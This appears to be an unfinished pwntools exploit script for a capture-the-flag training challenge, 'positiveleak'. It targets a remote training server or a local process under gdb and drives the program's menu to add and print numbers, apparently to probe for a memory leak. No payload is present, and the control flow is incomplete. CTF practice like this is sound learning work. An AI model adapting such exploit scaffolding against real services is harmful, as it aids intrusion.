from random import choice
from pwn import *
import sys

binary = ELF("./positiveleak")
libc = ELF("./libc-2.27.so")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 3003)
else:
    r = process('./positiveleak')
    gdb.attach(r, '''
        b add_numbers
        b *add_numbers+310
        b *add_numbers+344
        b *add_numbers+368 #aggiunge il numero in numbers
        c
    ''')


def add_numbers(arg, i):
   r.recvuntil("> ")
   r.send('0') 
   r.recvuntil("> ")
   r.send(str(i))
   input('start')
   for t in range(0, i+1) :
      r.recvuntil("> ")
      r.send(str(arg))


def print_numbers() -> list:
   r.recvuntil("> ")
   r.send('1')
   response = r.recvuntil("*")
   response = re.sub(r"(\\n0)+","", str(response).replace('b\'', '').replace('*\'', ''))
   response =response.split('\\n')
   while response.count('') != 0:
      response.remove('')
   return response

input('press a key..')

add_numbers(1, 6)
r.interactive()
numbers = print_numbers()
print(numbers)